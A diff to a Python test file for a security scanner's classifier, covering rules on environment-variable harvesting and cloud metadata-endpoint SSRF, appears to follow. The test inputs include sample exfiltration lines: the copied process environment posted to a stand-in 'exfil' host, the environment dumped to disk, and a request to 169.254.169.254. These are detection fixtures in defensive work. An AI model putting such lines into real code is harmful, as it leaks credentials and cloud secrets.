@@ -51,13 +51,17 @@ class TestRc21Classifier:
         )
         assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_FP
 
-    def test_copy_then_remote_post_real(self) -> None:
+    def test_copy_then_remote_post_definite_tp(self) -> None:
+        """Copy-then-exfil is the strongest TP signal — escalate-eligible."""
         ctx = _ctx(
             "RC-21",
             "all_env = os.environ.copy()",
             surrounding=("requests.post(\"https://exfil/\", json=all_env)",),
         )
-        assert classify_rule("RC-21", ctx) is FindingVerdict.REAL
+        # v2 (Step 4): copy + nearby exfil sink is now DEFINITE_TP so the
+        # `--extreme` flag can promote the severity. Bench harness already
+        # accepts DEFINITE_TP as a TP outcome.
+        assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_TP
 
     def test_copy_no_context_likely_fp(self) -> None:
         ctx = _ctx("RC-21", "env = os.environ.copy()")
@@ -80,6 +84,38 @@ class TestRc21Classifier:
     def test_doc_role_likely_fp(self) -> None:
         ctx = _ctx("RC-21", "Object.keys(process.env)", file_role="doc")
         assert classify_rule("RC-21", ctx) is FindingVerdict.LIKELY_FP
+
+    def test_copy_with_writefile_sink_definite_tp(self) -> None:
+        """Copy + file-write sink (json.dump / write_text) → DEFINITE_TP.
+
+        Writing the entire env block to disk for later collection is
+        unambiguous credential-harvest exfil.
+        """
+        ctx = _ctx(
+            "RC-21",
+            "snapshot = os.environ.copy()",
+            surrounding=("json.dump(snapshot, fp)",),
+        )
+        assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_TP
+
+    def test_definite_tp_only_in_source_role(self) -> None:
+        """Test/fixture/doc roles must NOT escalate even with exfil sink nearby.
+
+        The classifier promotes file_role guards above sink hints — the
+        whole point of role gating is to suppress exemplar code in tests
+        and docs from being treated as live exfil.
+        """
+        for role in ("test", "fixture"):
+            ctx = _ctx(
+                "RC-21",
+                "all_env = os.environ.copy()",
+                surrounding=("requests.post('https://exfil/', json=all_env)",),
+                file_role=role,
+                file_path=f"tests/{role}_env.py",
+            )
+            assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_FP, (
+                f"role={role} must not escalate"
+            )
 
 
 class TestRc22Classifier:
@@ -105,9 +141,15 @@ class TestRc22Classifier:
 
 
 class TestRc65Classifier:
-    def test_network_call_real(self) -> None:
+    def test_network_call_definite_tp(self) -> None:
+        """Same-line IMDS literal + network call → DEFINITE_TP — escalate-eligible.
+
+        The IMDS endpoint is the canonical SSRF target; combining the
+        literal with `requests.`/`urlopen(`/`fetch(` etc. on the SAME
+        line is unambiguous instance-metadata exfil.
+        """
         ctx = _ctx("RC-65", "requests.get('http://169.254.169.254/latest/')")
-        assert classify_rule("RC-65", ctx) is FindingVerdict.REAL
+        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_TP
 
     def test_unsafe_hosts_set_definite_fp(self) -> None:
         ctx = _ctx(
@@ -123,6 +165,23 @@ class TestRc65Classifier:
             "IMDS_HOSTS = ('169.254.169.254',)",
         )
         assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_FP
+
+    def test_definite_tp_only_in_source_role(self) -> None:
+        """Test/fixture/doc roles never escalate even with network call hints."""
+        for role, path in (
+            ("test", "tests/test_ssrf_detector.py"),
+            ("fixture", "tests/fixtures/imds.py"),
+        ):
+            ctx = _ctx(
+                "RC-65",
+                "requests.get('http://169.254.169.254/latest/')",
+                file_role=role,
+                file_path=path,
+            )
+            verdict = classify_rule("RC-65", ctx)
+            assert verdict is not FindingVerdict.DEFINITE_TP, (
+                f"role={role} must not escalate; got {verdict}"
+            )
 
 
 class TestRc87Classifier:
